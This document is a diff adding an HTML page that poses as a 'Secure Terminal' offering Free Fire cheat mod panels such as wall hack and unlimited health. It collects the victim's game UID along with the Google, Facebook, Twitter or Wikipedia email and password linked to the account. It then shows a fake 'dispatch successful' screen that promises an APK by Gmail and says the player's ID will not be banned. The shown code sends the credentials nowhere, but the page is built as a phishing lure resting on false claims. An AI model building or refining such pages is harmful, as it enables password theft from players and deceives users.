@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyberpunk Secure Terminal - Panel</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            background-color: #030208;
+            color: #00ffcc;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex; justify-content: center; align-items: center;
+            overflow-y: auto;
+            perspective: 1200px;
+        }
+
+        .cyber-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: 
+                linear-gradient(135deg, rgba(3, 2, 8, 0.90), rgba(15, 2, 25, 0.95)),
+                url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1920&auto=format&fit=crop') no-repeat center center;
+            background-size: cover;
+            background-position: center;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .cyber-box {
+            position: relative; z-index: 10;
+            width: 90%; max-width: 680px;
+            background: rgba(8, 4, 18, 0.90);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 2px solid #00ffcc;
+            border-radius: 10px; padding: 35px;
+            box-shadow: 0 0 40px rgba(0, 255, 204, 0.25), inset 0 0 20px rgba(255, 0, 127, 0.15);
+            margin: 40px 0;
+            
+            transform-origin: center center;
+            animation: snappyBookOpen 0.7s cubic-bezier(0.1, 1, 0.2, 1) forwards;
+        }
+
+        @keyframes snappyBookOpen {
+            0% {
+                transform: scaleX(0.01) scaleY(0.8) rotateY(90deg);
+                opacity: 0;
+                filter: blur(12px);
+            }
+            40% {
+                transform: scaleX(0.7) scaleY(0.95) rotateY(30deg);
+                opacity: 0.7;
+            }
+            100% {
+                transform: scaleX(1) scaleY(1) rotateY(0deg);
+                opacity: 1;
+                filter: blur(0);
+            }
+        }
+
+        .box-content {
+            opacity: 0;
+            transform: scale(0.92) translateY(15px);
+            animation: contentPopOut 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.7s forwards;
+        }
+
+        @keyframes contentPopOut {
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .cyber-box h2 {
+            color: #ff007f; font-size: 20px; margin-bottom: 4px; letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 0, 127, 0.8); text-align: center;
+        }
+
+        .cyber-sub {
+            color: #a78bfa; font-size: 10px; margin-bottom: 20px; letter-spacing: 1.5px; text-align: center;
+        }
+
+        .gmail-notice {
+            font-family: Arial, sans-serif;
+            font-size: 12px;
+            line-height: 1.5;
+            background: rgba(0, 0, 0, 0.3);
+            border-left: 3px solid #ff3333;
+            padding: 10px 14px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            white-space: pre-wrap;
+            overflow: hidden;
+            animation: redGreenShift 0.8s infinite alternate;
+        }
+
+        @keyframes redGreenShift {
+            0% {
+                color: #ff3333;
+                border-left-color: #ff3333;
+                background: rgba(255, 51, 51, 0.08);
+                text-shadow: 0 0 6px rgba(255, 51, 51, 0.5);
+            }
+            100% {
+                color: #00ff66;
+                border-left-color: #00ff66;
+                background: rgba(0, 255, 102, 0.08);
+                text-shadow: 0 0 6px rgba(0, 255, 102, 0.5);
+            }
+        }
+
+        .trial-notice-box {
+            font-family: Arial, sans-serif;
+            font-size: 11px;
+            line-height: 1.5;
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            font-weight: bold;
+            background: linear-gradient(270deg, #ff007f, #7928ca, #00ffcc, #ff007f);
+            background-size: 600% 600%;
+            animation: gradientAnimation 6s ease infinite;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .input-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px;
+        }
+
+        .input-group {
+            text-align: left;
+        }
+
+        .input-group.full-width {
+            grid-column: span 2;
+        }
+
+        .input-group label {
+            display: block; color: #00ffcc; font-size: 10px; margin-bottom: 5px; letter-spacing: 1.5px;
+            text-shadow: 0 0 5px rgba(0, 255, 204, 0.5);
+        }
+
+        .cyber-input, .cyber-select {
+            width: 100%; background: rgba(3, 2, 8, 0.9);
+            border: 1px solid rgba(0, 255, 204, 0.4);
+            padding: 11px; border-radius: 6px; color: #ffffff;
+            font-family: 'Courier New', Courier, monospace; font-size: 12px;
+            outline: none; transition: all 0.3s ease;
+        }
+
+        .cyber-input:focus, .cyber-select:focus {
+            border-color: #ff007f;
+            box-shadow: 0 0 15px rgba(255, 0, 127, 0.5);
+            background: rgba(15, 2, 25, 0.95);
+        }
+
+        .cyber-select option {
+            background: #080412;
+            color: #00ffcc;
+        }
+
+        .dynamic-section {
+            display: none;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: all 0.4s ease;
+        }
+
+        .dynamic-section.show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .cyber-btn {
+            background: linear-gradient(135deg, #ff007f, #7928ca);
+            color: #ffffff; border: none;
+            width: 100%; padding: 13px; border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px; font-weight: bold; cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(255, 0, 127, 0.5);
+            letter-spacing: 2px; text-transform: uppercase;
+            margin-top: 10px;
+        }
+
+        .cyber-btn:hover {
+            background: linear-gradient(135deg, #00ffcc, #0070f3);
+            color: #030208;
+            box-shadow: 0 0 30px #00ffcc;
+            transform: translateY(-2px);
+        }
+
+        .overlay-modal {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(3, 2, 8, 0.92);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+
+        .overlay-modal.active {
+            opacity: 1; pointer-events: auto;
+        }
+
+        .loader-content {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 60px; height: 60px; border: 4px solid rgba(0, 255, 204, 0.2);
+            border-top: 4px solid #ff007f; border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin: 0 auto 20px auto;
+            box-shadow: 0 0 15px #ff007f;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-box {
+            background: rgba(8, 4, 18, 0.95);
+            border: 2px solid #00ffcc;
+            border-radius: 12px; padding: 30px;
+            width: 90%; max-width: 500px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 255, 204, 0.3);
+            animation: popUpModal 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+
+        @keyframes popUpModal {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-box h3 {
+            color: #00ffcc; font-size: 20px; margin-bottom: 15px; letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.6);
+        }
+
+        .success-box p {
+            font-family: Arial, sans-serif; font-size: 13px; color: #dddddd; line-height: 1.6; margin-bottom: 25px;
+        }
+
+        @media(max-width: 600px) {
+            .input-grid { grid-template-columns: 1fr; }
+            .input-group.full-width { grid-column: span 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="cyber-bg"></div>
+
+    <div class="cyber-box" id="mainBox">
+        <div class="box-content">
+            <h2>⚡ SECURE TERMINAL</h2>
+            <p class="cyber-sub">ENCRYPTED NODE INTERFACE v9.5</p>
+            
+            <div class="gmail-notice" id="typewriterNotice"></div>
+
+            <div class="trial-notice-box">
+                ⏳ <b>Trial Policy:</b> We are providing this panel completely free for a 7-day trial period. After 7 days, it will automatically stop working, and a license key will be required. The key will be sent to your Gmail after completing the payment once your 7-day trial is completed.
+            </div>
+
+            <div class="input-grid">
+                <!-- Target Player UID -->
+                <div class="input-group full-width">
+                    <label>> TARGET PLAYER UID (10 Digits Only)</label>
+                    <input type="text" class="cyber-input" id="panelUser" maxlength="10" placeholder="Enter exactly 10-digit UID..." oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <!-- Player Username -->
+                <div class="input-group">
+                    <label>> PLAYER USERNAME (Max 16 chars)</label>
+                    <input type="text" class="cyber-input" id="playerUsername" maxlength="16" placeholder="Enter username...">
+                </div>
+
+                <!-- Player Level -->
+                <div class="input-group">
+                    <label>> PLAYER LEVEL (1 - 99)</label>
+                    <input type="number" class="cyber-input" id="playerLevel" min="1" max="99" placeholder="e.g. 65" oninput="if(this.value.length > 2) this.value = this.value.slice(0,2);">
+                </div>
+
+                <!-- Preferred Mod Panel -->
+                <div class="input-group full-width">
+                    <label>> SELECT PREFERRED MOD PANEL</label>
+                    <select class="cyber-select" id="panelType">
+                        <option value="" disabled selected>-- Select Mod Panel Type --</option>
+                        <option value="Headshot">Headshot Panel</option>
+                        <option value="Flying">Flying Panel</option>
+                        <option value="GlooWall">Unlimited Gloo Wall Panel</option>
+                        <option value="WallHack">Wall Hack Panel</option>
+                        <option value="Health">Unlimited Health Panel</option>
+                        <option value="Bullet">Unlimited Bullet Panel</option>
+                        <option value="VehicleSpeed">Fast Vehicle Speed Panel</option>
+                    </select>
+                </div>
+
+                <!-- Account Link Select -->
+                <div class="input-group full-width">
+                    <label>> FREE FIRE ACCOUNT LINK WITH</label>
+                    <select class="cyber-select" id="accountLinkType" onchange="handleAccountLinkChange()">
+                        <option value="" disabled selected>-- Select Platform --</option>
+                        <option value="Google">Google</option>
+                        <option value="Facebook">Facebook</option>
+                        <option value="Twitter">Twitter</option>
+                        <option value="Wikipedia">Wikipedia</option>
+                        <option value="Guest">Guest</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Dynamic Credentials Box -->
+            <div id="dynamicCredentialContainer" class="dynamic-section">
+                <div class="input-grid" style="margin-bottom: 0;">
+                    <div class="input-group">
+                        <label id="credLabel1">> PLATFORM ID / EMAIL</label>
+                        <input type="text" class="cyber-input" id="credInput1" placeholder="Enter ID or Email...">
+                    </div>
+                    <div class="input-group">
+                        <label id="credLabel2">> PLATFORM PASSWORD</label>
+                        <input type="password" class="cyber-input" id="credInput2" placeholder="Enter Password...">
+                    </div>
+                </div>
+            </div>
+
+            <button class="cyber-btn" onclick="startDispatchSequence()">DISPATCH APK TO GMAIL</button>
+        </div>
+    </div>
+
+    <!-- 1. Loading Overlay (2 Seconds) -->
+    <div class="overlay-modal" id="loadingOverlay">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <p style="color: #00ffcc; letter-spacing: 2px; font-size: 13px;">ENCRYPTING & DISPATCHING TO GMAIL...</p>
+        </div>
+    </div>
+
+    <!-- 2. Permanent Success Modal -->
+    <div class="overlay-modal" id="successModal">
+        <div class="success-box">
+            <h3>⚡ DISPATCH SUCCESSFUL</h3>
+            <p>
+                As mentioned, the requested <b>APK mode</b> will be sent to your registered <b>Gmail account within 48 hours</b>.<br><br>
+                Rest assured, our custom mod APK is fully secure and <b>will not ban your Free Fire ID</b> under any circumstances. Enjoy your 7-day trial!
+            </p>
+            <button class="cyber-btn" onclick="returnToHub()">RETURN TO HUB</button>
+        </div>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            playHackingSound();
+            setTimeout(() => {
+                startFastTypewriter();
+            }, 800);
+        });
+
+        function playHackingSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(180, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(450, audioCtx.currentTime + 0.3);
+                
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+                
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.35);
+            } catch (e) {}
+        }
+
+        // New Success Sound Chime Generator
+        function playSuccessSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const now = audioCtx.currentTime;
+
+                // Two-tone success chime
+                [523.25, 659.25, 783.99].forEach((freq, index) => {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(freq, now + (index * 0.1));
+
+                    gain.gain.setValueAtTime(0.12, now + (index * 0.1));
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + (index * 0.1) + 0.4);
+
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+
+                    osc.start(now + (index * 0.1));
+                    osc.stop(now + (index * 0.1) + 0.4);
+                });
+            } catch (e) {}
+        }
+
+        function startFastTypewriter() {
+            const textElement = document.getElementById('typewriterNotice');
+            const pureText = "⚠️ Notice: The requested panel APK mode will be sent directly to your registered Gmail account (captured during login). Please check your inbox/spam folder after submission.";
+            let index = 0;
+            textElement.innerHTML = "";
+            
+            function typeChar() {
+                if (index < pureText.length) {
+                    textElement.innerHTML += pureText.charAt(index);
+                    index++;
+                    setTimeout(typeChar, 12);
+                }
+            }
+            typeChar();
+        }
+
+        function handleAccountLinkChange() {
+            const linkType = document.getElementById('accountLinkType').value;
+            const container = document.getElementById('dynamicCredentialContainer');
+            const label1 = document.getElementById('credLabel1');
+            const label2 = document.getElementById('credLabel2');
+            const input1 = document.getElementById('credInput1');
+            const input2 = document.getElementById('credInput2');
+
+            input1.value = "";
+            input2.value = "";
+
+            if (linkType === 'Guest') {
+                container.classList.remove('show');
+                return;
+            }
+
+            container.classList.add('show');
+
+            if (linkType === 'Google') {
+                label1.innerText = "> VALID GOOGLE GMAIL ID";
+                input1.placeholder = "e.g. user@gmail.com";
+                label2.innerText = "> GOOGLE PASSWORD";
+                input2.placeholder = "Enter Google password...";
+            } else if (linkType === 'Facebook') {
+                label1.innerText = "> FB USERNAME / EMAIL / PHONE";
+                input1.placeholder = "Enter Facebook username/email/phone...";
+                label2.innerText = "> FACEBOOK PASSWORD";
+                input2.placeholder = "Enter Facebook password...";
+            } else if (linkType === 'Twitter') {
+                label1.innerText = "> TWITTER USERNAME / EMAIL";
+                input1.placeholder = "Enter Twitter username/email (with symbols allowed)...";
+                label2.innerText = "> TWITTER PASSWORD";
+                input2.placeholder = "Enter Twitter password...";
+            } else if (linkType === 'Wikipedia') {
+                label1.innerText = "> WIKIPEDIA USERNAME";
+                input1.placeholder = "Enter Wikipedia username...";
+                label2.innerText = "> WIKIPEDIA PASSWORD";
+                input2.placeholder = "Enter Wikipedia password...";
+            }
+        }
+
+        function startDispatchSequence() {
+            const user = document.getElementById('panelUser').value.trim();
+            const username = document.getElementById('playerUsername').value.trim();
+            const level = document.getElementById('playerLevel').value.trim();
+            const panel = document.getElementById('panelType').value;
+            const linkType = document.getElementById('accountLinkType').value;
+
+            // 1. UID Validation
+            if (!user || user.length !== 10 || !/^\d{10}$/.test(user)) {
+                alert("⚠️ Error: Target Player UID must be exactly 10 mathematical digits!");
+                return;
+            }
+
+            // 2. Username Validation
+            if (!username || username.length > 16 || !/^[a-zA-Z0-9]+$/.test(username)) {
+                alert("⚠️ Error: Player Username is required, must be up to 16 characters, and contain only English alphabets or numbers!");
+                return;
+            }
+
+            // 3. Level Validation
+            if (!level || parseInt(level) < 1 || parseInt(level) > 99) {
+                alert("⚠️ Error: Player Level must be a valid 2-digit number between 1 and 99!");
+                return;
+            }
+
+            // 4. Panel Type Selection
+            if (!panel) {
+                alert("⚠️ Error: Please select a preferred mod panel!");
+                return;
+            }
+
+            // 5. Account Link Platform Selection
+            if (!linkType) {
+                alert("⚠️ Error: Please select Free Fire account linking platform!");
+                return;
+            }
+
+            // 6. Platform Specific Validations
+            if (linkType !== 'Guest') {
+                const cred1 = document.getElementById('credInput1').value.trim();
+                const cred2 = document.getElementById('credInput2').value.trim();
+
+                if (!cred1 || !cred2) {
+                    alert(`⚠️ Error: Please fill in your ${linkType} account ID/Email and Password!`);
+                    return;
+                }
+
+                if (linkType === 'Google') {
+                    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+                    if (!gmailRegex.test(cred1)) {
+                        alert("⚠️ Error: Please enter a valid Google Gmail address ending with @gmail.com!");
+                        return;
+                    }
+                }
+            }
+
+            // Trigger Loading & Success Flow
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.classList.add('active');
+
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
+                
+                // Play Success Chime Sound Immediately as Success Modal Opens
+                playSuccessSound();
+            }, 2000);
+        }
+
+        function returnToHub() {
+            window.location.href = 'hub.html';
+        }
+    </script>
+</body>
+</html>
